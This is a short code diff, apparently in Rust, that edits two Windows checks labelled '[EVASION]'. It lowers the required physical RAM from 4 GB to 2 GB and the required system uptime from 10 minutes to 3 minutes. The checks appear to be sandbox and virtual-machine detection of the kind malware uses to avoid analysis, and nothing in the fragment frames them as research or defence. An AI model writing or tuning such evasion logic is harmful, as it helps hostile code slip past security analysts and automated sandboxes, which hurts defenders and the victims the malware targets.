@@ -95,8 +95,8 @@ fn check_physical_memory() -> bool {
             let total_gb = mem_status.ullTotalPhys / (1024 * 1024 * 1024);
             crate::debug_print!("[EVASION] Physical RAM: {} GB", total_gb);
             
-            // Require at least 4GB
-            return total_gb >= 4;
+            // Require at least 2GB
+            return total_gb >= 2;
         }
     }
     
@@ -125,8 +125,8 @@ fn check_system_uptime() -> bool {
         let uptime_minutes = uptime_ms / (1000 * 60);
         crate::debug_print!("[EVASION] System uptime: {} minutes", uptime_minutes);
         
-        // Require at least 10 minutes uptime
-        uptime_minutes >= 10
+        // Require at least 3 minutes uptime
+        uptime_minutes >= 3
     }
 }
 
